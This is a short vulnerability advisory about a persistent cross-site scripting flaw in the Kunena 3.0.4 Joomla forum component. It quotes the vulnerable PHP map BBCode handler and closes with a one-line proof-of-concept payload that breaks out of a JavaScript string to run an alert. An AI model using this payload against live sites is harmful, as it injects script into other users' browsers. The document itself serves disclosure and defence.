@@ -1,0 +1,34 @@
+Persistent XSS in Joomla::Kunena 3.0.4
+26. February 2014
+by Qoppa
+
++++ Description
+
+"Kunena is the leading Joomla forum component. Downloaded more than 3,750,000 times in nearly 6 years."
+
+Kunena is written in PHP. Users can post a Google Map using the following BBCode
+	[map]content[/map]
+
+Kunena creates a JavaScript based on input, but doesn't decode it correctly.
+
+
++++ Analysis
+
+Vulnerable function in \bbcode\bbcode.php (lines 1049-1116)
+
+1049	function DoMap($bbcode, $action, $name, $default, $params, $content) {
+	...
+1078	$document->addScriptDeclaration("
+1079	// <![CDATA[
+	...
+1097	var contentString = '<p><strong>".JText::_('COM_KUNENA_GOOGLE_MAP_NO_GEOCODE', true)." <i>".json_encode($content)."</i></strong></p>';
+	...
+1112	// ]]>"
+1113	);
+
+Single quotes remain untouched in $content, so it's possible to break out of encapsulation.
+
+
++++ PoC Exploit
+
+[map]'}});}});alert('XSS');(function(){{(function(){{var v='[/map]
